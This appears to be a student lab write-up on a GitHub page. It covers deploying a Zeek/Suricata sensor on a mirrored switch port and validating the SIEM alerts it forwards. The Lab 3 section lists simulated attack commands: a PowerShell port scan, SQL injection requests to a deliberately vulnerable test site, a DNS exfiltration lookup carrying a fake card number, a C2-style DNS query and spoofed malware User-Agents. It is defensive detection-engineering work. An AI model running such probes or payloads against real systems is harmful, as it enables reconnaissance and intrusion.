# Lab 1, 2 & 3: Sensor Deployment, Log Forwarding & Detection Engineering

**Mission:** Architect a full-stack security monitoring environment, deploy a Network Sensor (Zeek/Suricata) to ingest traffic via Port Mirroring, and execute Red Team adversary simulations to validate the detection pipeline against real-world threat vectors.

**Key Skills:** Virtualization (VMware), SPAN/Port Mirroring, Log Pipeline Configuration, Adversary Simulation (Red Teaming), Threat Hunting, Signature Validation.




## 1. Virtual Machine & Sensor Setup
The sensor VM required a specific networking configuration to ingest raw traffic without IP conflicts.

* **Host Hardware:** Laptop with 1 Internal NIC + 1 External USB Ethernet Adapter.
* **VM Network Mapping:**
    * **Adapter 1 (NAT):** Used for Management/Internet access (so the VM can update and talk to the SIEM).
    * **Adapter 2 (Bridged - VMnet0):** Mapped specifically to the **USB Ethernet Adapter**.
    * Constraint Solved: VMware's Network Editor was unlocked to force VMnet0 to bridge only to the USB adapter, ensuring it captured traffic from the Switch SPAN port (Port 18).
* **Switch Configuration:**
    * **Port 16:** Uplink/Internet.
    * **Port 18:** SPAN (Mirror) Port – Copying all firewall traffic to the Sensor.
 

<p align="center">
<img width="400" height="350" alt="VM Settings" src="https://github.com/user-attachments/assets/68281db9-67c6-4a28-8c01-03d0590ae4ac" />
<img width="400" height="350" alt="Network Editor" src="https://github.com/user-attachments/assets/ad478419-2f2e-4601-9e5c-cc432fd98ff9" />
</p>

### Sensor Initialization
* Configured the sensor interface for DHCP (via NAT adapter) to retrieve an IP.
* Uploaded the custom ThreatDefense configuration file via the web interface.
<img width="800" alt="Config Upload" src="https://github.com/user-attachments/assets/8bc52380-3657-468c-8709-f367e9d0f19a" />


---

## 2. Verification & Testing
Validated the sensor's ability to see traffic using CLI tools.
  *  Visited - http://neverssl.com -(HTTP Unencrypted)
  *  Ran  tcpdump -i ens34 port 80
<img width="800" height="700" alt="image" src="https://github.com/user-attachments/assets/22781de5-5470-4695-9a09-2dcb021f2c32" />

---
## 3. CLI Analysis Commands  & IDS Log Validation 
    *  htop / top - Visual bar graph of your CPU and Memory usage.
    *  grep "google" /var/log/syslog - Searches for specific text inside files.
    *  tcpdump -i ens34 port 80 or port 443 - Who is browsing the web? (Filter by Port 80/443)
    *  tcpdump -i ens34 host 8.8.8.8 - Is anyone talking to Google? (Filter by IP)
    *  tcpdump -i ens34 -A port 80 - Read the mail (ASCII Mode)
    *  tcpdump -i ens34 -q - Summary for each Packet
    *  cd /usr/local/zeek/logs/current - ls
    *  Suritica IDS confirmation --  tail -f /data/zeek/log/rnanager/conn. log — 
    *  Confirmed that Suricata and Zeek were generating logs in real-time.
      *    find / -name "fast.log" tail - f /data/suricata/log/fast.log
          *  cd /usr/local/zeek/logs/current
          *  ls -lh  -- # List active log files
          *  tail -f /data/suricata/log/fast.log
   
<img width="400" height="350" alt="image" src="https://github.com/user-attachments/assets/c6a35de1-6275-4472-9ffd-93fb2ef0034b" />
<img width="400" height="350" alt="image" src="https://github.com/user-attachments/assets/183bfc08-5bc2-417e-a176-d83a347f75f6" />
<img width="400" height="350" alt="image" src="https://github.com/user-attachments/assets/901bc75d-5c95-432f-8f55-69c393955a83" />
<img width="400" height="350" alt="image" src="https://github.com/user-attachments/assets/96908ef9-a299-4471-b1b6-27ecdacc1d5b" />

 
## 4. SIEM Integration Check
* Verifying that the sensor detected an attack signature and forwarded the alert to the SIEM dashboard.
* Trigger: Visited http://testmyids.com (Generates a benign GPL ATTACK_RESPONSE signature).
* Result: The sensor flagged the traffic, and the SIEM visualized the alert immediately.
 <img width="400" height="350" alt="image" src="https://github.com/user-attachments/assets/9ca8fdf1-14dc-47f0-9817-d8fe1a16353f" />
 <img width="400" height="350" alt="image" src="https://github.com/user-attachments/assets/7444f80c-f6bd-4e95-bd5d-94d52b11bd15" />



---


# Lab 3 Detection Engineering


---
## 1. Detection Engineering & Adversary Simulation.
Test SIEM File - Based Threats - Validated the sensor's ability to see traffic using CLI tools.
  *  curl -o eicar.com https://secure.eicar.org/eicar.com.txt
  *  Ran  tcpdump -i ens34 port 80
<img width="400" height="350" alt="image" src="https://github.com/user-attachments/assets/02e152d2-8707-4943-9403-e28ca39f65e4" />
<img width="400" height="350" alt="image" src="https://github.com/user-attachments/assets/d3e690c6-bab5-4f33-b6dd-0ea2007cbb01" />
<br><br><br>

C2 Callback (DNS Sinks)
  *  nslookup cyber-thief-test.com 8.8.8.8  -- "DNS Tunneling" to talk to hackers.
    
<br><br><br>

Port Scan
  *  powershell -Command "1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect('192.168.10.X',$_)) 'Port $_ is open!'}"
  *  Simulate a hacker looking for open doors.

<p align="center">
<img width="400" height="350" alt="image" src="https://github.com/user-attachments/assets/c272adea-e564-4f6c-badc-4e2ba7f9a9ba" />
<img width="400" height="350" alt="image" src="https://github.com/user-attachments/assets/8d37b150-8917-498e-b2aa-848e0fb3cf00" />
<br><br><br>


User-Agent Spoofing Test
* curl.exe -A "BlackSun" http://www.google.com
* Simulates a malicious tool or malware using a custom User-Agent string to evade detection or identify itself to command-and-control infrastructure.
<img width="400" height="350" alt="image" src="https://github.com/user-attachments/assets/4e174083-bad3-4a44-bde4-45b363e5e87e" />
<br><br><br>

DNS Connectivity Test
  *  Test-NetConnection -ComputerName 8.8.8.8 -Port 53
  *  Validates outbound DNS connectivity, similar to how malware checks if it can resolve domains or reach external C2 infrastructure.
<img width="400" height="350" alt="image" src="https://github.com/user-attachments/assets/f7ce543d-f4e0-469a-9b14-cf26fef0a330" />
<br><br><br>

SQL Injection Attempt (Web Attack Simulation)
  *  curl "http://testphp.vulnweb.com/artists.php?artist=1 OR 1=1--"
  *  Simulates a basic SQL injection attack attempting to bypass input validation and extract unauthorized data from a web application.
<img width="400" height="350" alt="image" src="https://github.com/user-attachments/assets/09aaa635-0c9e-4f6f-829b-0a8556f6c769" />
<br><br><br>

DNS Data Exfiltration Test
  * nslookup "CreditCard-1111-2222-3333-4444.ignore.com"
  * Simulates data exfiltration over DNS by embedding sensitive information inside a domain name query.
<img width="400" height="350" alt="image" src="https://github.com/user-attachments/assets/eadc3eb5-a754-41dd-a677-ba619591fd01" />
<br><br><br>

Cryptomining Detection (XMRig)
  * curl.exe -H "User-Agent: XMRig" http://www.google.com
  * Simulates cryptocurrency mining malware beaconing behavior using a known miner User-Agent string.

<img width="400" height="350" alt="image" src="https://github.com/user-attachments/assets/56afdb1d-8490-4881-8c4e-6e4195ebb6b8" />
<br><br><br>

Web Application Attacks (SQL Injection)
  * curl "http://testphp.vulnweb.com/artists.php?artist=1 OR 1=1"
  * Simulates an alternate SQL injection payload used to test for vulnerable web application parameters
<img width="400" height="350" alt="image" src="https://github.com/user-attachments/assets/a6c98564-0111-4935-91f2-a1ef48387b5e" />

---
SIEM Alerts Generating 
<p align="center">
<img width="1221" height="177" alt="image" src="https://github.com/user-attachments/assets/c2cd0025-3eb3-411c-b9d3-cf5d1db460d0" />
</p>




---
## Project Summary Lab 1/2/3
* **Architected** a physical security monitoring solution using Port Mirroring (SPAN) on a managed switch to capture East-West and North-South traffic.
* **Deployed** and configured a Linux-based Network Sensor (Zeek/Suricata) in a virtualized environment (VMware) with strict traffic isolation via a dedicated USB network bridge.
* **Established** a log forwarding pipeline to normalize and ingest raw network telemetry into a SIEM dashboard for analysis.
* **Executed** a comprehensive "Red Team" adversary simulation to validate detection capabilities, including:
    * **Malware:** Validated file signature detection using the EICAR test object.
    * **Command & Control:** Simulated C2 beaconing via DNS Sinkhole/Tunneling techniques.
    * **Reconnaissance:** Detected active port scanning and network enumeration.
    * **Web Attacks:** Identified SQL Injection (SQLi) attempts and User-Agent spoofing (Botnets/Cryptominers).
* **Validated** the end-to-end incident response workflow by correlating raw packet captures (PCAP) with generated SIEM alerts.










